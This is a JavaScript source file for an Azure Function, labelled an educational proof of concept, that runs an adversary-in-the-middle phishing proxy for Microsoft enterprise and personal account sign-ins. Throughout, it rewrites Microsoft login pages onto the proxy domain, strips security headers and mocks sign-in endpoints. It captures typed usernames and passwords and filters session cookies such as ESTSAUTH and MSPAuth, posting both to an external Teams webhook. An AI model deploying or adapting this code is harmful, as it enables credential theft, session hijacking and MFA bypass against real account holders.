/**
 * Azure Function AiTM Phishing PoC for Entra ID accounts.
 * This code is provided for educational purposes only and provided withou any liability or warranty.
 * Based on: https://github.com/zolderio/AITMWorker
 */

const { app } = require("@azure/functions");

// Support both enterprise and personal Microsoft accounts
const upstream_enterprise = "login.microsoftonline.com";
const upstream_personal = "login.live.com";
const upstream_path = "/";
const teams_webhook_url = process.env.TEAMS_WEBHOOK_URI;

// Helper function to get current timestamp
function getCurrentTimestamp() {
  return new Date().toISOString();
}

// headers to delete from upstream responses
const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only",
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
  "Set-Cookie",
];

// Enhanced URL replacement function to handle both domains
async function replace_response_text(response, upstream_url, original_url) {
  return response
    .text()
    .then((text) => {
      // Replace both possible Microsoft domains with our proxy domain
      let modifiedText = text.replace(new RegExp(upstream_enterprise, "g"), original_url.host);
      modifiedText = modifiedText.replace(new RegExp(upstream_personal, "g"), original_url.host);
      
      // Also replace any protocol+domain combinations
      modifiedText = modifiedText.replace(new RegExp(`https://${upstream_enterprise}`, "g"), `${original_url.protocol}//${original_url.host}`);
      modifiedText = modifiedText.replace(new RegExp(`https://${upstream_personal}`, "g"), `${original_url.protocol}//${original_url.host}`);
      
      return modifiedText;
    });
}

// Function to determine which upstream to use based on the request
function getUpstreamDomain(request, original_url) {
  const userAgent = request.headers.get('user-agent') || '';
  const referer = request.headers.get('referer') || '';
  
  // Check if this is a redirect from login.live.com or contains personal account indicators
  if (referer.includes('login.live.com')) {
    return upstream_personal;
  }
  
  // Check username parameter (URL decoded)
  if (original_url.searchParams.has('username')) {
    const username = decodeURIComponent(original_url.searchParams.get('username'));
    if (username.includes('@outlook.com') || 
        username.includes('@hotmail.com') ||
        username.includes('@live.com')) {
      return upstream_personal;
    }
  }
  
  // Check URL parameters that might indicate personal account flow
  if (original_url.searchParams.has('login_hint')) {
    const loginHint = decodeURIComponent(original_url.searchParams.get('login_hint'));
    if (loginHint.includes('@outlook.com') || 
        loginHint.includes('@hotmail.com') || 
        loginHint.includes('@live.com')) {
      return upstream_personal;
    }
  }
  
  // Check for OAuth paths that typically go to login.live.com
  if (original_url.pathname.includes('/oauth20_authorize.srf') ||
      original_url.pathname.includes('/oauth20_token.srf') ||
      original_url.pathname.includes('/ppsecure/')) {
    return upstream_personal;
  }
  
  // Default to enterprise domain for most cases
  return upstream_enterprise;
}

app.http("phishing", {
  methods: ["GET", "POST"],
  authLevel: "anonymous",
  route: "/{*x}",
  handler: async (request, context) => {

    async function dispatchMessage(message) {
      context.log(message);
      if (teams_webhook_url) {
        await fetch(teams_webhook_url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ text: message }),
        })
          .then((response) =>
            response.ok
              ? console.log("successfully dispatched MSG")
              : console.error(`Failed to dispatch: ${response.statusText}`)
          )
          .catch((error) => console.log(error));
      }
    }

    // original URLs
    const upstream_url = new URL(request.url);
    const original_url = new URL(request.url);

    // Determine which upstream domain to use
    const selected_upstream = getUpstreamDomain(request, original_url);
    
    // Handle critical API endpoints that need mock responses to prevent login failures
    const criticalEndpoints = [
      '/GetExperimentAssignments.srf',
      '/GetOneTimeCode.srf',
      '/GetSessionState.srf',
      '/GetCredentialType.srf',
      // Additional endpoints for personal accounts
      '/GetCredentialTypeAsyncEx.srf',
      '/GetAccountInformation.srf',
      '/GetAccountRecoveryData.srf',
      '/ValidateAccountRecoveryPIN.srf',
      '/SendAccountRecoveryCode.srf'
    ];
    
    const isCriticalEndpoint = criticalEndpoints.some(endpoint => 
      original_url.pathname.includes(endpoint)
    );
    
    // Enhanced mock responses based on domain type
    if (isCriticalEndpoint) {
      try {
        context.log(`Mocking critical endpoint: ${original_url.pathname} for domain: ${selected_upstream}`);
        
        // Determine if this is a personal account (login.live.com) or enterprise
        const isPersonalAccount = selected_upstream === "login.live.com";
        
        // Return mock successful responses for critical endpoints
        let mockResponse = "";
        let mockHeaders = new Headers();
      
      if (original_url.pathname.includes('/GetExperimentAssignments.srf')) {
        if (isPersonalAccount) {
          // Personal accounts need different experiment structure
          mockResponse = JSON.stringify({
            "experiments": {
              "MsaAccountRecoveryExp": 1,
              "MsaSecurityInfoExp": 1,
              "MsaVerificationExp": 1
            },
            "success": true,
            "status": "success"
          });
        } else {
          mockResponse = JSON.stringify({
            "experiments": [],
            "success": true
          });
        }
      } else if (original_url.pathname.includes('/GetOneTimeCode.srf')) {
        if (isPersonalAccount) {
          // Personal accounts have different OTC structure
          mockResponse = JSON.stringify({
            "success": true,
            "status": "success",
            "message": "Verification code sent",
            "flowState": "OTCSENT",
            "phoneNumberId": "1"
          });
        } else {
          mockResponse = JSON.stringify({
            "success": true,
            "message": "Code sent successfully"
          });
        }
      } else if (original_url.pathname.includes('/GetSessionState.srf')) {
        if (isPersonalAccount) {
          mockResponse = JSON.stringify({
            "sessionState": "Active",
            "success": true,
            "status": "success",
            "canary": "true"
          });
        } else {
          mockResponse = JSON.stringify({
            "state": "active",
            "success": true
          });
        }
      } else if (original_url.pathname.includes('/GetCredentialType.srf')) {
        if (isPersonalAccount) {
          mockResponse = JSON.stringify({
            "IfExistsResult": 0,
            "ThrottleStatus": 1,
            "Credentials": {
              "PrefCredential": 1,
              "HasPassword": true,
              "RemoteNgcParams": null,
              "FidoParams": null,
              "SasParams": null
            },
            "EstsProperties": {
              "UserTenantBranding": null,
              "DomainType": 3
            },
            "success": true,
            "status": "success"
          });
        } else {
          mockResponse = JSON.stringify({
            "credentialType": 1,
            "success": true
          });
        }
      } else if (original_url.pathname.includes('/GetCredentialTypeAsyncEx.srf')) {
        // Enhanced credential type endpoint for personal accounts
        mockResponse = JSON.stringify({
          "IfExistsResult": 0,
          "ThrottleStatus": 1,
          "Credentials": {
            "PrefCredential": 1,
            "HasPassword": true,
            "RemoteNgcParams": null,
            "FidoParams": null,
            "SasParams": null
          },
          "EstsProperties": {
            "UserTenantBranding": null,
            "DomainType": 3
          },
          "FlowToken": "MOCK_FLOW_TOKEN",
          "success": true,
          "status": "success"
        });
      } else if (original_url.pathname.includes('/GetAccountInformation.srf')) {
        mockResponse = JSON.stringify({
          "success": true,
          "status": "success",
          "accountInfo": {
            "displayName": "User Account",
            "userPrincipalName": "user@outlook.com"
          }
        });
      } else if (original_url.pathname.includes('/GetAccountRecoveryData.srf')) {
        mockResponse = JSON.stringify({
          "success": true,
          "status": "success",
          "recoveryData": {
            "hasAlternateEmail": true,
            "hasPhoneNumber": true
          }
        });
      } else if (original_url.pathname.includes('/ValidateAccountRecoveryPIN.srf')) {
        mockResponse = JSON.stringify({
          "success": true,
          "status": "success",
          "validationResult": "Valid"
        });
      } else if (original_url.pathname.includes('/SendAccountRecoveryCode.srf')) {
        mockResponse = JSON.stringify({
          "success": true,
          "status": "success",
          "message": "Recovery code sent successfully"
        });
      } else if (original_url.pathname.includes('/post.srf')) {
        // Handle password validation for personal accounts
        if (isPersonalAccount) {
          mockResponse = JSON.stringify({
            "success": true,
            "status": "success",
            "validated": true,
            "flowBeginRegion": "US",
            "flowState": "Valid",
            "urlPost": "",
            "urlRedirect": "https://login.live.com/oauth20_authorize.srf",
            "isSignupDisallowed": false,
            "isFederatedNonInteractive": false,
            "showRemoteConnectOption": false,
            "showSignInWithPhoneAlternative": false,
            "hasPassword": true,
            "showCantAccessAccount": true,
            "showForgotPassword": true,
            "showCreateAccount": true,
            "isRecoveryAttemptBlocked": false,
            "isUserTenantSignUp": false,
            "showPasswordField": true,
            "credentials": {
              "hasPassword": true,
              "remoteConnectType": 0
            }
          });
        } else {
          mockResponse = JSON.stringify({
            "success": true,
            "status": "success"
          });
        }
      }
      
      // Set appropriate headers for the domain type
      mockHeaders.set("Content-Type", "application/json");
      mockHeaders.set("Access-Control-Allow-Origin", "*");
      mockHeaders.set("Access-Control-Allow-Credentials", "true");
      
      if (isPersonalAccount) {
        // Personal accounts need additional headers
        mockHeaders.set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
        mockHeaders.set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With");
        mockHeaders.set("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
        mockHeaders.set("Pragma", "no-cache");
        mockHeaders.set("Expires", "0");
        mockHeaders.set("X-Content-Type-Options", "nosniff");
        mockHeaders.set("X-Frame-Options", "DENY");
      } else {
        mockHeaders.set("Cache-Control", "private");
      }
      
      // Enhanced logging for debugging
      context.log(`[${getCurrentTimestamp()}] 🎯 MOCK RESPONSE: ${original_url.pathname} (${selected_upstream}) - Length: ${mockResponse.length} chars`);
      context.log(`[${getCurrentTimestamp()}] 🔍 REQUEST: ${request.method} ${original_url.href}`);
      if (original_url.pathname.includes('/post.srf')) {
        context.log(`[${getCurrentTimestamp()}] 🔐 PASSWORD POST INTERCEPTED - Personal Account: ${isPersonalAccount}`);
        context.log(`[${getCurrentTimestamp()}] 📝 Mock Response Preview: ${mockResponse.substring(0, 200)}...`);
      }
      
        return new Response(mockResponse, {
          status: 200,
          headers: mockHeaders,
        });
      } catch (error) {
        context.error(`Error in mock endpoint handling: ${error.message}`);
        context.error(`Stack trace: ${error.stack}`);
        context.error(`URL: ${original_url.pathname}`);
        context.error(`Domain: ${selected_upstream}`);
        
        // Return a basic success response even on error to prevent 500s
        return new Response(JSON.stringify({
          "success": true,
          "experiments": [],
          "status": "success"
        }), {
          status: 200,
          headers: new Headers({
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Credentials": "true"
          })
        });
      }
    }
    
    // Rewriting to appropriate Microsoft domain
    upstream_url.host = selected_upstream;
    upstream_url.port = 443;
    upstream_url.protocol = "https:";

    // Fix path construction to avoid double slashes
    if (upstream_url.pathname == "/") {
      upstream_url.pathname = upstream_path;
    }
    // Don't add upstream_path prefix for existing paths - they're already complete

    context.log(
      `Proxying ${request.method}: ${original_url} to: ${upstream_url} (${selected_upstream})`
    );

    const new_request_headers = new Headers(request.headers);
    new_request_headers.set("Host", upstream_url.host);
    new_request_headers.set("accept-encoding", "gzip;q=0,deflate;q=0");
    new_request_headers.set(
      "user-agent",
      "AzureAiTMFunction/1.0 (Windows NT 10.0; Win64; x64)"
    );
    new_request_headers.set(
      "Referer",
      original_url.protocol + "//" + original_url.host
    );

    // Obtain password from POST body and preserve body for forwarding
    let requestBody = null;
    if (request.method === "POST") {
      const temp_req = await request.clone();
      const body = await temp_req.text();
      requestBody = body; // Preserve the body for forwarding
      
      const keyValuePairs = body.split("&");

      // extract key-value pairs for username and password
      const msg = Object.fromEntries(
        keyValuePairs
          .map((pair) => ([key, value] = pair.split("=")))
          .filter(([key, _]) => key == "login" || key == "passwd")
          .map(([_, value]) => [
            _,
            decodeURIComponent(value.replace(/\+/g, " ")),
          ])
      );

      if (msg.login && msg.passwd) {
        dispatchMessage(
          `Captured login information (${selected_upstream}): <br>` + JSON.stringify(msg)
        );
      }
    }

    // Ensure Content-Length is properly set for POST requests
    if (request.method === "POST" && requestBody !== null) {
      new_request_headers.set("Content-Length", requestBody.length.toString());
    }

    const original_response = await fetch(upstream_url.href, {
      method: request.method,
      headers: new_request_headers,
      body: requestBody,
      duplex: "half",
    });

    if (
      request.headers.get("Upgrade") &&
      request.headers.get("Upgrade").toLowerCase() == "websocket"
    ) {
      return original_response;
    }

    // Adjust response headers
    const new_response_headers = new Headers(original_response.headers);
    delete_headers.forEach((header) => new_response_headers.delete(header));
    new_response_headers.set("access-control-allow-origin", "*");
    new_response_headers.set("access-control-allow-credentials", true);

    // Replace cookie domains to match our proxy
    try {
      // getSetCookie is the successor of Headers.getAll
      const originalCookies = original_response.headers.getSetCookie();

      originalCookies.forEach((originalCookie) => {
        let modifiedCookie = originalCookie.replace(
          new RegExp(upstream_url.host, "g"),
          original_url.host
        );
        // Also handle the other domain in case of cross-domain cookies
        const otherDomain = selected_upstream === upstream_enterprise ? upstream_personal : upstream_enterprise;
        modifiedCookie = modifiedCookie.replace(
          new RegExp(otherDomain, "g"),
          original_url.host
        );
        new_response_headers.append("Set-Cookie", modifiedCookie);
      });

      const cookies = originalCookies.filter(
        (cookie) =>
          cookie.startsWith("ESTSAUTH=") ||
          cookie.startsWith("ESTSAUTHPERSISTENT=") ||
          cookie.startsWith("SignInStateCookie=") ||
          cookie.startsWith("MSPAuth=") ||
          cookie.startsWith("MSPProf=") ||
          cookie.startsWith("MSPOK=")
      );

      if (cookies.length >= 1) {
        dispatchMessage(
          `Captured authentication cookies (${selected_upstream}): <br>` +
            JSON.stringify(cookies)
        );
      }
    } catch (error) {
      console.error(error);
    }

    const original_text = await replace_response_text(
      original_response.clone(),
      upstream_url,
      original_url
    );

    return new Response(original_text, {
      status: original_response.status,
      headers: new_response_headers,
    });
  },
});
